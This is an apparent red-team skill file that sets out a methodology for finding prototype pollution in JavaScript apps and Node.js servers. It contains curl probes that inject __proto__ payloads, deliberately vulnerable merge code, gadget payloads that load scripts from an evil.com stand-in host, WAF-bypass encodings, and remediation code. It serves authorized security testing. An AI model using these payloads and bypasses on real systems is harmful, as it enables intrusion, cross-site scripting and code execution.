---
name: hunt-prototype-pollution
description: Audit client/server JavaScript prototype pollution flaws.
version: 2.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires curl, jq, node
metadata:
  tags: [prototype-pollution, nodejs, javascript, express, dom]
  category: redteam
  related_skills:
    - hunt-dom
    - hunt-xss
    - triage-validation
---

# HUNT-PROTOTYPE-POLLUTION — JavaScript Prototype Pollution Assessment

Advanced security assessment methodology for auditing Client-Side and Server-Side Prototype Pollution (CSPP/SSPP) vulnerabilities across modern JavaScript ecosystems (Node.js, Express, Next.js, and Single-Page Applications). Incorporates modern runtime instrumentation, non-destructive differential probes, library-specific gadget chains, and WAF normalization bypasses.

---

## When to Use

- Auditing frontend SPAs (React, Vue, Angular) and Node.js backend microservices that parse complex or nested user inputs.
- Investigating applications utilizing recursive object merges, deep cloning, configuration loaders, or query-string parsers (`qs`, `lodash`, `jquery`, custom helpers).
- Testing JSON APIs, URL query parameters, hash fragments, or `postMessage` handlers that accept nested object properties.
- Evaluating whether a controllable prototype property mutation can be chained with a security-sensitive gadget (DOM manipulation, script loading, command configuration, or authentication bypass).

---

## Prerequisites

- Target in authorized scope with explicit testing permission.
- Required tools: `curl`, `jq`, `node` (Node.js runtime), and Chrome DevTools / Burp Suite with DOM-Invader.
- Set writable output directory:
  ```bash
  export OUTPUT_DIR="${OUTPUT_DIR:-./output}"
  mkdir -p "$OUTPUT_DIR"
  ```
- **Strict Non-Destructive Testing Rule**: Never pollute functional built-in methods like `toString`, `valueOf`, or `length` in production; mutating these can cause process-wide crashes and denial of service. Always use isolated canary keys or non-fatal diagnostic properties.

---

## How to Run

```bash
TARGET="target.com"
OUTPUT_DIR="${OUTPUT_DIR:-./output}"
mkdir -p "$OUTPUT_DIR/$TARGET/prototype_pollution"

# 1. Non-Destructive Express Server-Side Differential Probe (json spaces formatting)
# Normal request baseline:
curl -sk --max-time 10 "https://$TARGET/api/v1/profile" \
  -o "$OUTPUT_DIR/$TARGET/prototype_pollution/baseline.json"

# Injected probe attempting to alter JSON formatting space via prototype:
curl -sk --max-time 10 -X POST "https://$TARGET/api/v1/settings" \
  -H "Content-Type: application/json" \
  -d '{"preferences": {"__proto__": {"json spaces": 10}}}'

# Verification request (Check if response JSON is indented by 10 spaces):
curl -sk --max-time 10 "https://$TARGET/api/v1/profile" \
  -o "$OUTPUT_DIR/$TARGET/prototype_pollution/post_probe.json"

# 2. Client-Side Quick Probe (Testing query string parser via URL)
curl -sk --max-time 10 "https://$TARGET/?__proto__[canaryTest]=verified" \
  -o "$OUTPUT_DIR/$TARGET/prototype_pollution/client_probe.html"
```

---

## Procedure

### Architectural Concept: Primitive vs. Gadget vs. Impact

A complete Prototype Pollution assessment strictly distinguishes three phases:

```text
[Input Source] ──► [Merge / Setter Primitive] ──► [Prototype Mutation] ──► [Execution Gadget] ──► [Security Impact]
```

1. **Pollution Primitive**: The vulnerable code construct (recursive merge, deep clone, or dynamic property setter) that mutates `Object.prototype`.
2. **Prototype Mutation**: The state where all existing and newly created JavaScript objects inherit the injected property.
3. **Execution Gadget**: A pre-existing piece of application code that reads the injected property and uses it in a security-sensitive sink (e.g., passing a URL property into a script loader or evaluating a configuration object in process execution).
4. **Security Impact**: The demonstrable harm achieved through the gadget (DOM XSS, Authorization Bypass, Remote Code Execution, or SSRF).

---

### Step 1: Reconnaissance & Attack-Surface Discovery

Map data-ingestion surfaces that transform external inputs into nested JavaScript objects:

#### 1. Ingestion Point Classification
- **Query & Hash Parsers**:
  - URL query strings parsed with extended nesting enabled (e.g., `qs.parse` allowing `__proto__.param=value` or `constructor[prototype][param]=value`).
  - Hash fragments (`window.location.hash`) parsed into application state on client-side routing.
- **REST & JSON APIs**:
  - Complex JSON request bodies (`POST` / `PUT` / `PATCH`) containing nested configuration or preferences objects.
- **Client-Side Communication**:
  - `window.addEventListener('message', ...)` parsing `event.data` into deep object setters without origin validation.
  - Storage ingestion (`localStorage`, `sessionStorage`) deserialized via `JSON.parse` and merged with defaults.
- **Import / Export Handlers**:
  - CSV/JSON file upload processors that construct internal configuration maps.

#### 2. Dependency Discovery & Source-Map Analysis
Download client-side JavaScript bundles and recover original filenames via source maps:
```bash
# Extract JS files
katana -u "https://$TARGET" -d 3 -jc -silent | grep -E "\.js(\?|$)" > js_urls.txt

# Search for common vulnerable merge libraries or functions
for url in $(cat js_urls.txt); do
  curl -sk --max-time 5 "$url" | grep -iE "(lodash|merge|extend|cloneDeep|defaultsDeep|query-string|angular\.extend)" | head -n 2
done
```

---

### Step 2: Static Analysis & Code Audit Patterns

Search source code or beautified bundles for vulnerable recursive merge and property assignment patterns:

#### A. Vulnerable Recursive Merge Implementation
```javascript
// Classic Vulnerable Pattern: Does not guard __proto__ or constructor
function merge(target, source) {
    for (let key in source) {
        if (typeof target[key] === 'object' && typeof source[key] === 'object') {
            merge(target[key], source[key]); // Recursive step
        } else {
            target[key] = source[key];       // Primitive: target['__proto__']['canary'] = ...
        }
    }
    return target;
}
```

#### B. Dynamic Path Setter Pattern
```javascript
// Vulnerable Path Setter: Splitting dot-notation without validation
function setProperty(obj, path, value) {
    const keys = path.split('.');
    let current = obj;
    for (let i = 0; i < keys.length - 1; i++) {
        current = current[keys[i]]; // If path starts with '__proto__', traverses to Object.prototype
    }
    current[keys[keys.length - 1]] = value;
}
// setProperty(userSettings, "__proto__.admin", true);
```

#### C. Static Audit Search Signatures
Audit codebases for these specific constructs using static grep / Semgrep:
```bash
# Grep for recursive assignment and key reflection
grep -rnE "(target\[key\]\s*=\s*source\[key\]|obj\[keys\[i\]\])" ./src/

# Grep for unkeyed Object.assign into empty literals
grep -rnE "Object\.assign\(\s*\{\}\s*,\s*req\.body\)" ./src/
```

---

### Step 3: Advanced Client-Side Hunting & Runtime Instrumentation

#### 1. Runtime Instrumentation (The Proxy Trap Hook)
Inject this hook into your browser console or early in a local test harness to catch every undefined property lookup on `Object.prototype`. This reveals every active gadget currently running in the page:

```javascript
// Runtime Prototype Access Tracer: Detects potential gadget properties automatically
(function() {
    const handler = {
        get(target, prop, receiver) {
            if (!(prop in target) && typeof prop === 'string') {
                console.warn(`[GADGET DETECTED] Read undefined prototype property: '${prop}'`, new Error().stack);
            }
            return Reflect.get(target, prop, receiver);
        }
    };
    Object.setPrototypeOf(Object.prototype, new Proxy({}, handler));
})();
```

#### 2. Universal Client-Side Gadget Library Reference

| Library / Framework | Injected Property Path | Sink / Trigger Condition | Impact |
|---|---|---|---|
| **Google Tag Manager** | `Object.prototype.customScripts = ['https://evil.com/xss.js']` | Executed upon tag load. | DOM XSS |
| **jQuery (< 3.4.0)** | `Object.prototype.preventDefault = true` | Evaluated in event handlers. | Event Handler Bypass |
| **Lodash (< 4.17.12)** | `Object.prototype.sourceURL = "\n/*# sourceURL=*/\nalert(1)//"` | Evaluated in `_.template()`. | Client-Side Code Exec |
| **AngularJS** | `Object.prototype.v = ...` | Expression evaluation context. | Sandbox Escape XSS |
| **Adobe Target** | `Object.prototype.url = 'https://evil.com/payload.js'` | Dynamically created `<script>` tags. | Full DOM XSS |

---

### Step 4: Advanced Server-Side / Node.js Probing & Non-Destructive Gadgets

In Node.js backends, polluting `Object.prototype` affects all concurrent and subsequent requests across the active worker process. Testing must use non-destructive differential indicators rather than destabilizing payloads.

#### 1. Non-Destructive Diagnostic Sinks

*   **Express Response Formatting (`json spaces`)**:
    Express's `res.json()` checks `app.get('json spaces') || req.app.get('json spaces')`. If undefined, it falls back to inspecting `Object.prototype['json spaces']`:
    ```json
    {
      "__proto__": {
        "json spaces": 10
      }
    }
    ```
    *Observation*: If vulnerable, subsequent API responses from the server are formatted with 10 indentation spaces instead of compact JSON, confirming server-side pollution with zero downtime.

*   **Status Code Invariance (`status`)**:
    Polluting numeric status codes causes Express handlers to return non-standard statuses (e.g. `510` instead of `200`):
    ```json
    {
      "__proto__": {
        "status": 510
      }
    }
    ```

#### 2. Critical Server-Side Gadget Classes (Node.js & Microservices)

| Runtime Component | Targeted Property | Execution Sink | Impact |
|---|---|---|---|
| **Child Process (`child_process`)** | `shell`, `NODE_OPTIONS`, `env` | `spawn()`, `exec()`, `fork()` | Remote Code Execution |
| **Template Engine (EJS)** | `outputFunctionName`, `destructuredLocals` | `ejs.renderFile()` | Code Execution |
| **Template Engine (Pug)** | `block`, `compileDebug` | `pug.compile()` | Code Execution |
| **HTTP Clients (Axios, Got)** | `proxy`, `baseURL`, `headers` | `axios.get()` | SSRF / Token Leak |
| **CORS Middleware (`cors`)** | `origin: true` | `cors()` preflight evaluation | Cross-Origin Data Leak |

---

### Step 5: Advanced WAF Normalization & Parser Bypass Matrix

When a WAF or API gateway inspects inputs for `"__proto__"`, apply structural and encoding bypasses:

```text
1. Dot vs. Bracket Discrepancy:
   ?__proto__[canary]=test
   ?__proto__.canary=test
   ?constructor[prototype][canary]=test
   ?constructor.prototype.canary=test

2. Unicode Escaping (JSON Parsers):
   {"\u005f\u005fproto\u005f\u005f": {"canary": "val"}}
   {"\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072": {"prototype": {"canary": "val"}}}

3. URL Encoding Variations:
   %5F%5Fproto%5F%5F[canary]=val
   %255F%255Fproto%255F%255F[canary]=val (Double Encoding)

4. Prototype Key Pollution via Object Keys:
   {"__proto__": {"__proto__": {"canary": "nested"}}}
```

---

## Pitfalls & False-Positive Elimination

To avoid reporting false positives during triage, verify findings against this checklist:

| Observed Signal | Potential Trap | Elimination Procedure |
|---|---|---|
| **Canary reflected in JSON response** | Simple Input Reflection | Check if the canary appears in responses for **other unpolluted endpoints**. If it only appears on the request where you submitted it, the API simply reflected your input; the prototype was not polluted. |
| **Object property exists on target object** | Standard Property Assignment | Verify on an empty literal `{}` in a fresh scope. If `{}.canary` is `undefined`, the prototype was not mutated. |
| **Vulnerable npm package detected in bundle** | Unreachable Code Path | Merely finding `lodash@4.17.11` in `package-lock.json` is not a vulnerability. Prove that user-controlled data reaches the vulnerable merge function. |
| **Application crashes / 500 error** | Prototype Corruption (DoS) | Polluting native methods (`toString`, `valueOf`) causes application-wide crashes. This is a denial-of-service failure, not proof of code execution. Always use unique custom strings. |

---

## Verification

Before filing an assessment report, confirm all steps in the verification decision tree:

- [ ] **Primitive Confirmed**: Document the exact input path and parser that allows `Object.prototype` to receive injected properties.
- [ ] **Dual-Session Isolation**:
  - *Client-Side*: Demonstrate in a separate clean browser tab that navigation with the payload triggers the gadget.
  - *Server-Side*: Verify behavior using two distinct sessions (User A submits payload; User B's independent request demonstrates changed behavior).
- [ ] **Gadget Documented**: Identify the exact file, line, or function where the polluted property is read and passed into a sensitive sink.
- [ ] **Minimal Safe PoC**: Ensure the PoC executes a benign confirmation (e.g. `console.log` or boolean indicator) without disrupting application state or leaking sensitive production data.

---

## Evidence Collection Standard

Package the following technical artifacts for engineering remediation:

1. **Vulnerability Summary**: Explicitly identify whether the flaw is Client-Side or Server-Side.
2. **The Injection Request & Response**: Full raw HTTP request containing the prototype payload and the corresponding response.
3. **The Verification Request & Response**: Secondary HTTP interaction demonstrating that a newly created, unpolluted object inherited the injected property.
4. **Code Trace / Sink Location**: Decompiled or unminified JavaScript reference showing the vulnerable recursive merge or path setter.
5. **Gadget Chain Explanation**: Step-by-step documentation showing how the polluted property is consumed by application logic.

---

## Architectural Remediation

Provide developers with standard structural remediations:

### 1. Object Prototype Freezing (Defense-in-Depth)
Prevent runtime prototype mutation entirely on application initialization:
```javascript
// At application bootstrap (server or client):
Object.freeze(Object.prototype);
```

### 2. Using Safe Prototype-Free Dictionaries
When creating objects intended to store dynamic key-value pairs, avoid using the default `Object.prototype`:
```javascript
// Create dictionary without prototype inheritance:
const map = Object.create(null);
map[userKey] = userValue; // Cannot pollute Object.prototype
```

### 3. Hardened Deep Merge Validation
Explicitly reject dangerous property names before executing recursive merge:
```javascript
function safeMerge(target, source) {
    for (let key in source) {
        // Strict prototype key protection
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue;
        }
        if (typeof target[key] === 'object' && typeof source[key] === 'object') {
            safeMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

### 4. Modern Data Structures
Replace raw object dictionaries with ES6 `Map` or `Set` collections when mapping arbitrary user-supplied keys to values:
```javascript
const userSettings = new Map();
userSettings.set(key, value); // Completely immune to prototype traversal
```
